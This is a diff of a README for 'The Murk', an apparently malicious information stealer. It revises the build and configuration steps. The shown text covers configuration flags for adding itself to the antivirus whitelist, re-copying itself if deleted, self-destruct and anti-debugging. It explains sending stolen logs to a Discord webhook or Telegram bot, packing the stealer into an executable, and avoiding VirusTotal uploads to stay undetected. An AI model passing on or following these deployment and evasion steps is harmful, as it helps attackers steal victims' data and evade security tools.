@@ -149,7 +149,6 @@ __Don't upload builded stealer to Virustotal__. The more often you upload it, th
 ---
 
 ### 🔨Building(manually)
-⚠I recommended create a virtual enviorment first before doing anything.
 
 **Configuring**
 
@@ -171,14 +170,6 @@ Download the source code. Then go to `The Murk\preferences` dir and rename `defa
 > 
 > If you set this var as `True`, the application will automatically add itself to the whitelist of AV and make a copy of itself in case of deleting
 >
-> * `selfDestruct`
->
-> If you set this var as `True`, the application will automatically delete itself after completing
->
-> * `debuging`
-> 
-> disables AntiDebug (don't change if you don't know what it is responsible for)
->
 > * `pathToLogs`
 > 
 >the path that will be stored logs before sending, the path from user dir. Should start with `\\` and `\\` should be between dirs names
@@ -187,7 +178,7 @@ Now let's figure out how to fill out the fields of `sendData`.
 
 **For Discord(same for builder)**
 
-So firstly, create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks#conclusion). Then, insert the webhook link in a separate field as in example `[0, "url of your WebHook", "null"]`.
+So firstly, create your Discord server and webhook there. [How to do it](https://hookdeck.com/webhooks/platforms/how-to-get-started-with-discord-webhooks). Then, insert the webhook link in a separate field as in example `[0, "url of your WebHook", "null"]`.
 
 **For Telegram(same for builder)**
 
@@ -195,7 +186,7 @@ So firstly, go to the [@BotFather](https://t.me/BotFather) bot and create your o
 
 **Packing**
 
-Finally, to let all this deal work you need to download [python](https://www.python.org/downloads/). Then open cmd in the main project dir insert in the console `pip install -r requirements.txt`, and wait till all downloads are completed. To pack all of it into an exe file just run `pack.bat`, and wait till the end of packing. The exe file gonna be placed in the dist folder.
+Install required packages and run `pack.bat`. The executable will be in `dist`. I recommended using a virtual enviorment instead of just install and pack it directly.
 
 ---
 ### ❌Builder errors
@@ -210,7 +201,7 @@ If you have error like this:
 
 ![error](Images/error1.png)
 
-input in cmd `pip uninstall typing` and than input `y`
+Uninstall [typing](https://pypi.org/project/typing/) package.
 
 
 ---
